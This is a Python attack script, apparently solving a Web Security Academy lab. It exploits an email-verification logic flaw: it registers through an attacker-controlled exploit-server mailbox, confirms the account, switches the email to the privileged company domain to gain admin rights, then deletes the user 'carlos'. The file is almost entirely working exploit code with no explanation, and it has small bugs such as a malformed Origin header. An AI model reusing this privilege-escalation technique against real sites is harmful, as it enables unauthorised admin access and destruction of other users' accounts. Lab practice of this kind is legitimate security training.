import requests

DOMAIN = "0a59004b04e880038304dc3300f700d0.web-security-academy.net"
ATTACKER_EMAIL_DOMAIN = "exploit-0a24007304ec809983b3dbdb013e0026.exploit-server.net"
ATTACKER_EMAIL = "attacker@" + ATTACKER_EMAIL_DOMAIN
ADMIN_DOMAIN = "dontwannacry.com"
ADMIN_USERNAME = "admin1"
ADMIN_PASSWORD = "admin1"


HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https:/{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/register",
    "Upgrade-Insecure-Requests": "1",
    "Cookie": ""
}

def get_csrf_token_register():
    url = f"https://{DOMAIN}/register"
    response = requests.get(url, headers=HEADERS)

    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]

    HEADERS["Cookie"] = "session=" + response.cookies["session"] + ";"

    return csrf_token

def register():
    csrf_token = get_csrf_token_register()
    url = f"https://{DOMAIN}/register"
    data = {
        "csrf": csrf_token,
        "username": ADMIN_USERNAME,
        "email": ATTACKER_EMAIL,
        "password": ADMIN_PASSWORD
    }

    response = requests.post(url, headers=HEADERS, data=data, allow_redirects=False)

    if response.status_code == 302:
        print("Register successful")
        print(response.headers["Set-Cookie"])

def verify_email():
    url = f"https://{ATTACKER_EMAIL_DOMAIN}/email?raw=1"  # change raw index to your last mail index | 0 if you run at first time
    response = requests.get(url)

    verify_url = "https://" + response.text.split("https://")[1].split("Thanks")[0].strip()

    response = requests.get(verify_url)
    # print(response.text)

def get_csrf_token_login():
    url = f"https://{DOMAIN}/login"
    response = requests.get(url, headers=HEADERS)

    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]

    HEADERS["Cookie"] = "session=" + response.cookies["session"] + ";"

    return csrf_token

def login():
    csrf_token = get_csrf_token_register()
    url = f"https://{DOMAIN}/login"
    data = {
        "csrf": csrf_token,
        "username": ADMIN_USERNAME,
        "password": ADMIN_PASSWORD
    }

    response = requests.post(url, headers=HEADERS, data=data, allow_redirects=False)

    if response.status_code == 302:
        print("Login successful")
        print(response.headers["Set-Cookie"])

    HEADERS["Cookie"] = "session=" + response.headers["Set-Cookie"].split("session=")[1].split(";")[0] + ";"

def get_csrf_token_myaccount():
    url = f"https://{DOMAIN}/my-account"
    response = requests.get(url, headers=HEADERS)

    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]

    return csrf_token

def change_email():
    csrf_token = get_csrf_token_myaccount()
    url = f"https://{DOMAIN}/my-account/change-email"
    data = {
        "csrf": csrf_token,
        "email": ADMIN_USERNAME + "@" + ADMIN_DOMAIN
    }

    response = requests.post(url, headers=HEADERS, data=data, allow_redirects=False)

    if response.status_code == 302:
        print("Change email successful")

    print(response.text)
    print(response.headers)

def delete_user(username="carlos"):
    url = f"https://{DOMAIN}/admin/delete?username={username}"
    response = requests.get(url, headers=HEADERS)

register()
verify_email()
login()
change_email()
delete_user()